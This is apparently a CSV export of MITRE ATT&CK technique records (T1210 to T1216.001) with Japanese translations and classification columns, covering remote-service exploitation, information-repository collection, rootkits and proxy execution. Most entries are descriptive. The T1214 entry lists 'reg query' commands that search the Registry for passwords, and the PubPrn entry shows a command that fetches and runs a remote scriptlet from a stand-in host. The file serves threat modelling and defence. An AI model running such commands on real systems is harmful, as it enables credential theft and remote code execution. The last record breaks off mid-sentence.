T1210,,Exploitation of Remote Services,リモートサービスの悪用,"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system. An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources. There are several well-known vulnerabilities that exist in common services such as SMB(Citation: CIS Multiple SMB Vulnerabilities) and RDP(Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL(Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.(Citation: Broadcom VMSA-2024-0019) Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",攻撃者はネットワーク内部に侵入後、リモートサービスを悪用して内部システムへの不正アクセスを得る可能性があります。ソフトウェア脆弱性の悪用とは、攻撃者がプログラム・サービス・OSソフトウェア/カーネル内のプログラミングエラーを悪用し、攻撃者が制御するコードを実行する行為を指します。侵害後のリモートサービス悪用の一般的な目的は、横方向移動によるリモートシステムへのアクセス獲得です。 攻撃者は、リモートシステムが脆弱な状態にあるかどうかを判断する必要がある場合があり、これは[ネットワークサービス検出](https://attack.mitre.org/techniques/T1046)やその他の検出手法を通じて行われる可能性がある。具体的には、ネットワークに展開されている可能性のある一般的な脆弱なソフトウェア、脆弱性を示す可能性のある特定のパッチの欠如、またはリモート悪用を検出または封じ込めるために使用される可能性のあるセキュリティソフトウェアを探す方法である。 サーバーは横方向移動攻撃にとって高価値な標的となる可能性が高いですが、追加リソースへのアクセスや優位性を提供するエンドポイントシステムもリスクに晒される可能性があります。 SMB（出典: CIS Multiple SMB Vulnerabilities）やRDP（出典: NVD CVE-2017-0176）といった共通サービス、ならびにMySQL（出典: NVD CVE-2016-6662）やWebサーバーサービスなど内部ネットワーク内で使用される可能性のあるアプリケーションには、複数の既知の脆弱性が存在します。(引用元: NVD CVE-2014-7169)(引用元: Ars Technica VMWare Code Execution Vulnerability 2021) さらに、VMware vCenter インストールには数多くの脆弱性が存在し、脅威アクターが侵害された vCenter サーバーから仮想マシン、さらには ESXi ハイパーバイザーへと横方向に移動することを可能にする可能性があります。(引用元: Broadcom VMSA-2024-0019) 脆弱なリモートサービスの権限レベルによっては、横方向の移動の悪用によって、攻撃者が [特権昇格のための悪用](https://attack.mitre.org/techniques/T1068) を達成する可能性もあります。,lateral-movement,Linux;Windows;macOS;ESXi,remote_service_abuse,boundary_crossing,endpoint_execution;network_connectivity;database_access,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82,2018-04-18T17:59:24.739Z,2025-04-15T19:58:53.590Z,,,,
T1211,,Exploitation for Defense Evasion,防御回避のための悪用,"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them. Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection. There have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",攻撃者はシステムやアプリケーションの脆弱性を悪用し、セキュリティ機能を回避する可能性があります。脆弱性の悪用とは、プログラム・サービス・OSソフトウェアやカーネル自体のプログラミング上の誤りを攻撃者が利用し、攻撃者が制御するコードを実行する行為を指します。防御用セキュリティソフトウェア自体にも脆弱性が存在し、それらが無効化または迂回される可能性があります。 攻撃者は、偵察を通じて環境にセキュリティソフトウェアが存在することを事前に把握している場合や、システム侵害中または直後に[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1518/001)を行う場合があります。 セキュリティソフトウェアは直接標的とされる可能性が高い。検出回避を目的とした持続的脅威グループによるアンチウイルスソフトウェアへの標的攻撃事例が存在する。また、SaaSアプリケーションのパブリッククラウドインフラにおける脆弱性が防御境界を迂回（引用: Facebookフィッシング攻撃におけるSalesforceゼロデイ脆弱性）、セキュリティログを回避（引用: AWS Service CatalogにおけるCloudTrail迂回手法）、または隠蔽インフラを展開（引用: GhostToken GCP脆弱性）する事例も確認されている。,defense-evasion,Linux;Windows;macOS;SaaS;IaaS,credential_abuse,stealth,authentication_system;user_interaction;endpoint_execution;cloud_control_plane;saas_in_use;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b,2018-04-18T17:59:24.739Z,2025-04-15T19:59:24.778Z,,,,
T1212,,Exploitation for Credential Access,認証情報取得のための悪用,"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack) Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access) Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",攻撃者は、認証情報を収集するためにソフトウェアの脆弱性を悪用する可能性があります。ソフトウェア脆弱性の悪用とは、攻撃者がプログラム、サービス、またはオペレーティングシステムソフトウェアやカーネル自体内のプログラミングエラーを悪用し、攻撃者が制御するコードを実行することを指します。認証および認可メカニズムは、有用な認証情報を入手したり、システムへの認証済みアクセスを得るプロセスを迂回したりする手段として、攻撃者による悪用の標的となる可能性があります。 その一例が`MS14-068`であり、これはKerberosを標的とし、ドメインユーザーの権限を使用してKerberosチケットを偽造するために利用される。(引用: Technet MS14-068)(引用: ADSecurity Detecting Forged Tickets) もう一つの例はリプレイ攻撃であり、攻撃者は当事者間で送信されるデータパケットを傍受し、後でこれらのパケットを再生する。 サービスが認証要求を適切に検証しない場合、これらの再生パケットにより攻撃者が当事者の1人を装い、不正なアクセスや権限を取得する可能性があります。（引用元：Bugcrowd Replay Attack）（引用元：Comparitech Replay Attack）（引用元：Microsoft Midnight Blizzard Replay Attack）このような悪用はクラウド環境でも実証されています。 例えば、攻撃者はパブリッククラウドインフラストラクチャの脆弱性を悪用し、意図しない認証トークンの生成や更新を可能にした事例がある。(引用: Storm-0558 techniques for unauthorized email access) 認証情報へのアクセスを目的とした悪用は、標的としたプロセスや取得した認証情報によっては権限昇格にもつながり得る。,credential-access,Linux;Windows;macOS;Identity Provider,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;email_infrastructure;cloud_control_plane,specified,AD / Directory Server;Business Workstation;Mail / Collaboration;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36,2018-04-18T17:59:24.739Z,2025-04-15T22:30:06.288Z,,,,
T1213,,Data from Information Repositories,情報リポジトリからのデータ,"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)). The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository: * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)) * Work / project schedules * Source code snippets * Links to network shares and other internal resources * Contact or other sensitive information about business partners and customers, including personally identifiable information (PII) Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following: * Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databases * Collaboration platforms such as SharePoint, Confluence, and code repositories * Messaging platforms such as Slack and Microsoft Teams In some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.(Citation: Mitiga)(Citation: TrendMicro Exposed Redis 2020)(Citation: Cybernews Reuters Leak 2022)",攻撃者は情報リポジトリを活用して貴重な情報を収集する可能性があります。情報リポジトリは情報の保存を可能にするツールであり、通常はユーザー間のコラボレーションや情報共有を促進するために使用され、攻撃者が資格情報へのアクセス、横方向の移動、防御回避といったさらなる目的を達成するのに役立つ可能性のある多様なデータを保存できます。あるいは、標的情報への直接アクセスを可能にする場合もあります。 攻撃者は外部共有機能を悪用し、機密文書を組織外の受信者と共有することもある（例：[クラウドアカウントへのデータ転送](https://attack.mitre.org/techniques/T1537)）。 以下は、攻撃者にとって潜在的な価値を持ち、情報リポジトリ上で発見される可能性のある情報の例を簡潔に列挙したものです：* ポリシー、手順、基準* 物理/論理ネットワーク図* システムアーキテクチャ図* 技術システム文書* テスト/開発用認証情報（例：[保護されていない認証情報](https://attack.mitre.org/techniques/T1552)） * 作業／プロジェクトスケジュール * ソースコード断片 * ネットワーク共有やその他内部リソースへのリンク * ビジネスパートナーや顧客に関する連絡先その他の機密情報（個人識別情報（PII）を含む） リポジトリに保存される情報は、具体的なインスタンスや環境によって異なる場合があります。一般的な情報リポジトリの例としては以下が挙げられます： * IaaSデータベース、エンタープライズデータベースなどのストレージサービス、および顧客関係管理（CRM）データベースなどのより専門的なプラットフォーム * SharePoint、Confluence、コードリポジトリなどのコラボレーションプラットフォーム * SlackやMicrosoft Teamsなどのメッセージングプラットフォーム 場合によっては、情報リポジトリが不適切に保護されていることがあり、典型的には、意図せず全ユーザーに過度に広範なアクセスを許可したり、認証されていないユーザーへの公開アクセスを許可したりしています。 これは特に、AWSリレーショナルデータベースサービス（RDS）、Redis、ElasticSearchなどのクラウドネイティブまたはクラウドホスト型サービスで頻繁に見られる。(引用: Mitiga)(引用: TrendMicro Exposed Redis 2020)(引用: Cybernews Reuters Leak 2022),collection,Linux;Windows;macOS;SaaS;IaaS;Office Suite,credential_abuse,asset_access,authentication_system;user_interaction;network_connectivity;cloud_control_plane;file_storage_access;database_access;logging_monitoring,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416,2018-04-18T17:59:24.739Z,2025-04-15T22:15:46.213Z,,,,
T1213.001,T1213,Confluence,Confluence,"Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as: * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)) * Work / project schedules * Source code snippets * Links to network shares and other internal resources",攻撃者はConfluenceリポジトリを利用して貴重な情報を収集する可能性があります。開発環境ではAtlassian JIRAと併せて使用されることが多く、Confluenceは通常、開発関連ドキュメントの保存に使用されますが、一般的に以下のような多様な有用な情報を含む場合があります： * ポリシー、手順、基準 * 物理/論理ネットワーク図 * システムアーキテクチャ図 * 技術システム文書 * テスト/開発用認証情報（例：[保護されていない認証情報](https://attack.mitre.org/techniques/T1552)） * 作業/プロジェクトスケジュール * ソースコードスニペット * ネットワーク共有やその他の内部リソースへのリンク,collection,SaaS,credential_abuse,asset_access,authentication_system;user_interaction;network_connectivity;file_storage_access;logging_monitoring,specified,File Server;Log / Monitoring Server,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--7ad38ef1-381a-406d-872a-38b136eb5ecc,2020-02-14T13:09:51.004Z,2025-04-15T22:09:18.055Z,,,,
T1213.002,T1213,Sharepoint,SharePoint,"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint: * Policies, procedures, and standards * Physical / logical network diagrams * System architecture diagrams * Technical system documentation * Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)) * Work / project schedules * Source code snippets * Links to network shares and other internal resources",攻撃者は、SharePointリポジトリを貴重な情報を収集する情報源として活用する可能性があります。SharePointには、攻撃者が内部ネットワークやシステムの構造・機能を把握するのに役立つ情報が頻繁に含まれています。例えば、以下は攻撃者にとって潜在的な価値を持つ可能性があり、SharePoint上でも見つかる可能性がある情報の例です： * ポリシー、手順、基準 * 物理/論理ネットワーク図 * システムアーキテクチャ図 * 技術システム文書 * テスト/開発用認証情報（例：[保護されていない認証情報](https://attack.mitre.org/techniques/T1552)） * 作業/プロジェクトスケジュール * ソースコードスニペット * ネットワーク共有やその他の内部リソースへのリンク,collection,Windows;Office Suite,credential_abuse,asset_access,authentication_system;user_interaction;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a,2020-02-14T13:35:32.938Z,2025-04-15T23:07:18.929Z,,,,
T1213.003,T1213,Code Repositories,コードリポジトリ,"Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git. Once adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or [Unsecured Credentials](https://attack.mitre.org/techniques/T1552) contained within software's source code. Having access to software's source code may allow adversaries to develop [Exploits](https://attack.mitre.org/techniques/T1587/004), while credentials may provide access to additional resources using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: Wired Uber Breach)(Citation: Krebs Adobe) **Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1593/003), which focuses on conducting [Reconnaissance](https://attack.mitre.org/tactics/TA0043) via public code repositories.",攻撃者はコードリポジトリを利用して貴重な情報を収集する可能性があります。コードリポジトリとは、ソースコードを保存しソフトウェアビルドを自動化するツール/サービスです。内部でホストされる場合もあれば、Github、GitLab、SourceForge、BitBucketなどのサードパーティサイトに非公開でホストされる場合もあります。 ユーザーは通常、Webアプリケーションやgitなどのコマンドラインユーティリティを通じてコードリポジトリを操作します。攻撃者が被害者ネットワークやプライベートコードリポジトリへのアクセス権を取得すると、ソフトウェアのソースコード内に含まれる専有ソースコードや[保護されていない認証情報](https://attack.mitre.org/techniques/T1552)などの機密情報を収集する可能性があります。 ソフトウェアのソースコードへのアクセスにより、攻撃者は[エクスプロイト](https://attack.mitre.org/techniques/T1587/004)を開発できる可能性があり、認証情報は[有効なアカウント](https://attack.mitre.org/techniques/T1078)を使用して追加リソースへのアクセスを提供する可能性があります。(引用: Wired Uber Breach)(引用: Krebs Adobe)**注:** これは、公開コードリポジトリを介した[偵察](https://attack.mitre.org/tactics/TA0043)に焦点を当てた[コードリポジトリ](https://attack.mitre.org/techniques/T1593/003)とは異なります。,collection,SaaS,credential_abuse,asset_access,authentication_system;user_interaction;endpoint_execution;network_connectivity,specified,Unknown,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--cff94884-3b1c-4987-a70b-6d5643c621c3,2021-05-11T18:51:16.343Z,2025-04-15T22:04:59.867Z,,,,
T1213.004,T1213,Customer Relationship Management Software,顧客関係管理ソフトウェア,"Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data. Once adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized [Phishing](https://attack.mitre.org/techniques/T1566) emails, engage in SIM swapping, or otherwise target the organization’s customers in ways that enable financial gain or the compromise of additional organizations.(Citation: Bleeping Computer US Cellular Hack 2022)(Citation: Bleeping Computer Mint Mobile Hack 2021)(Citation: Bleeping Computer Bank Hack 2020) CRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.",攻撃者は顧客関係管理（CRM）ソフトウェアを活用し、貴重な情報を抽出する可能性があります。CRMソフトウェアは、組織が顧客とのやり取りを追跡・管理し、顧客データを保存するために使用されます。攻撃者が被害組織へのアクセス権を獲得すると、CRMソフトウェアから顧客データを抽出する可能性があります。これには、氏名、メールアドレス、電話番号、住所などの個人識別情報（PII）に加え、購入履歴やITサポート対応履歴などの詳細情報が含まれる場合があります。 このデータを収集することで、敵対者はパーソナライズされた[フィッシング](https://attack.mitre.org/techniques/T1566)メールを送信したり、SIMスワッピングを行ったり、その他の方法で組織の顧客を標的にし、金銭的利益を得たり、追加の組織を侵害したりすることが可能になる。(引用元: Bleeping Computer US Cellular Hack 2022)(引用元: Bleeping Computer Mint Mobile Hack 2021)(引用元: Bleeping Computer Bank Hack 2020)CRMソフトウェアはオンプレミスまたはクラウドでホストされる。これらのソリューションに保存される情報は、具体的なインスタンスや環境によって異なる。CRMソフトウェアの例としては、Microsoft Dynamics 365、Salesforce、Zoho、Zendesk、HubSpotなどがある。,collection,SaaS,data_collection,asset_access,user_interaction;email_infrastructure;cloud_control_plane;saas_in_use,specified,Mail / Collaboration,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--bbfbb096-6561-4d7d-aa2c-a5ee8e44c696,2024-07-01T20:06:13.664Z,2025-04-15T22:12:49.744Z,,,,
T1213.005,T1213,Messaging Applications,メッセージングアプリケーション,"Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information. The following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications: * Testing / development credentials (i.e., [Chat Messages](https://attack.mitre.org/techniques/T1552/008)) * Source code snippets * Links to network shares and other internal resources * Proprietary data(Citation: Guardian Grand Theft Auto Leak 2022) * Discussions about ongoing incident response efforts(Citation: SC Magazine Ragnar Locker 2021)(Citation: Microsoft DEV-0537) In addition to exfiltrating data from messaging applications, adversaries may leverage data from chat messages in order to improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts.(Citation: Sentinel Labs NullBulge 2024)(Citation: Permiso Scattered Spider 2023)",攻撃者は、Microsoft Teams、Google Chat、Slackなどのチャットおよびメッセージングアプリケーションを利用して、貴重な情報を収集する可能性があります。 以下は、攻撃者にとって潜在的な価値を持つ可能性があり、メッセージングアプリケーション上でも見つかる可能性がある情報の例を簡潔に列挙したものです：* テスト／開発用認証情報（例：[チャットメッセージ](https://attack.mitre.org/techniques/T1552/008)）* ソースコードのスニペット* ネットワーク共有やその他の内部リソースへのリンク* 専有データ(出典: Guardian Grand Theft Auto Leak 2022) * 進行中のインシデント対応に関する議論(出典: SC Magazine Ragnar Locker 2021)(出典: Microsoft DEV-0537) メッセージングアプリケーションからのデータ流出に加え、攻撃者は標的選定の精度向上を目的としてチャットメッセージのデータを活用する可能性があります。例えば、環境に関する詳細情報の収集や、進行中のインシデント対応活動の回避などが挙げられます。(引用元: Sentinel Labs NullBulge 2024)(引用元: Permiso Scattered Spider 2023),collection,SaaS;Office Suite,credential_abuse,asset_access,authentication_system;user_interaction;network_connectivity;file_storage_access,specified,File Server;Identity / SaaS (IdP/SSO);Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--fb75213f-cfb0-40bf-a02f-3bad93d6601e,2024-08-30T13:50:42.023Z,2025-04-15T22:48:58.763Z,,,,
T1214,,Credentials in Registry,レジストリ内の認証情報,The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons. Example commands to find Registry keys related to password information: (Citation: Pentestlab Stored Credentials) * Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code> * Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code>,Windowsレジストリには、システムや他のプログラムが使用する設定情報が保存されています。攻撃者は、他のプログラムやサービスで使用するために保存された認証情報やパスワードを探すためにレジストリを照会することがあります。 これらの認証情報は自動ログオンに使用される場合がある。パスワード情報に関連するレジストリキーを検索する例示コマンド： (引用元: Pentestlab Stored Credentials)* ローカルマシンハイブ: <code>reg query HKLM /f password /t REG_SZ /s</code>* 現在のユーザーハイブ: <code>reg query HKCU /f password /t REG_SZ /s</code>,credential-access,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--2edd9d6a-5674-4326-a600-ba56de467286,2018-04-18T17:59:24.739Z,2025-04-25T15:15:20.034Z,,,,
T1215,,Kernel Modules and Extensions,カーネルモジュールと拡張機能,"Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming) When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview) Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",ロード可能カーネルモジュール（Loadable Kernel Modules、LKMs）は、要求に応じてカーネルにロードおよびアンロード可能なコードの断片です。システムを再起動することなくカーネルの機能を拡張します。例えば、モジュールの一種であるデバイスドライバは、カーネルがシステムに接続されたハードウェアにアクセスすることを可能にします。 (引用: Linux Kernel Programming)悪意を持って使用された場合、ロード可能カーネルモジュール（LKMs）は、最高レベルのOS特権（リング0）で動作するカーネルモードの[ルートキット](https://attack.mitre.org/techniques/T1014)の一種となり得る。 (引用: Linux Kernel Module Programming Guide) 攻撃者はロード可能カーネルモジュールを利用して、システム上に密かに潜伏し防御を回避できます。実環境での事例が確認されており、いくつかのオープンソースプロジェクトも存在します。(引用: Volatility Phalanx2) (引用: CrowdStrike Linux Rootkit) (引用: GitHub Reptile) (引用: GitHub Diamorphine) LKMベースのルートキットに共通する機能には、自己隠蔽、ファイル・プロセス・ネットワーク活動の部分的隠蔽、ログ改ざん、認証済みバックドアの提供、非特権ユーザーへのrootアクセス付与などがある。(引用: iDefense Rootkit Overview) カーネル拡張（kextとも呼ばれる）は、LinuxのLKMと同様にmacOSで機能を読み込むために使用される。 これらは<code>kextload</code>および<code>kextunload</code>コマンドを通じてロードおよびアンロードされます。この手法が利用可能な事例が複数確認されています。(引用元: RSAC 2015 San Francisco Patrick Wardle) (引用元: Synack Secure Kernel Extension Broken) 実環境での事例も確認されています。(引用元: Securelist Ventir),persistence,Linux;macOS,script_command_execution,foothold,privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5,2018-04-18T17:59:24.739Z,2025-04-25T15:15:41.330Z,,,,
T1216,,System Script Proxy Execution,システムスクリプトプロキシ実行,"Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)",攻撃者は、証明書で署名された信頼されたスクリプトを悪用し、悪意のあるファイルの実行をプロキシする可能性があります。Microsoftからダウンロードされた、またはWindowsインストール時にデフォルトで存在する複数のMicrosoft署名付きスクリプトが、他のファイルの実行をプロキシするために利用される可能性があります。（引用元：LOLBASプロジェクト）この動作は、攻撃者がアプリケーション制御や署名検証を回避する悪意のあるファイルをシステム上で実行するために悪用される可能性があります。（引用元：GitHub Ultimate AppLocker Bypass List）,defense-evasion,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe,2018-04-18T17:59:24.739Z,2025-04-16T20:37:23.298Z,,,,
T1216.001,T1216,PubPrn,PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn) Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script. In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).","攻撃者はPubPrnを利用して悪意のあるリモートファイルの実行をプロキシする可能性がある。PubPrn.vbsはActive Directoryドメインサービスにプリンターを公開する[Visual Basic](https://attack.mitre.org/techniques/T1059/005)スクリプトである。 このスクリプトは Microsoft によって署名されている場合があり、<code>Cscript.exe</code> を通じて [Windows コマンドシェル](https://attack.mitre.org/techniques/T1059/003) で実行されることが一般的です。 たとえば、次のコードは、指定されたドメイン内にプリンタを公開します。<code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>。(引用: pubprn) 敵対者は、PubPrn を悪用して、リモートサイトでホストされている悪意のあるペイロードを実行する可能性があります。(引用元: Enigma0x3 PubPrn Bypass) そのためには、攻撃者は 2 番目の <code>script:</code> パラメータを設定して、リモートサイトにホストされているスクリプトレットファイル (.sct) を参照することができます。 コマンドの例としては、<code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code> があります。この動作により、このスクリプトの悪用を考慮していない署名検証の制限やアプリケーション制御ソリューションをバイパスできる可能性があります。 Windows の後続バージョン (10 以降) では、リモートサイトからのプロキシ実行を防ぐため、<code>PubPrn.vbs</code> が更新されています。これは、2 番目のパラメータで指定されるプロトコルを <code>script:</code> モノイカー（HTTP(S) 経由でリモートコードを参照するために使用される可能性がある）ではなく、<code>LDAP://</code> 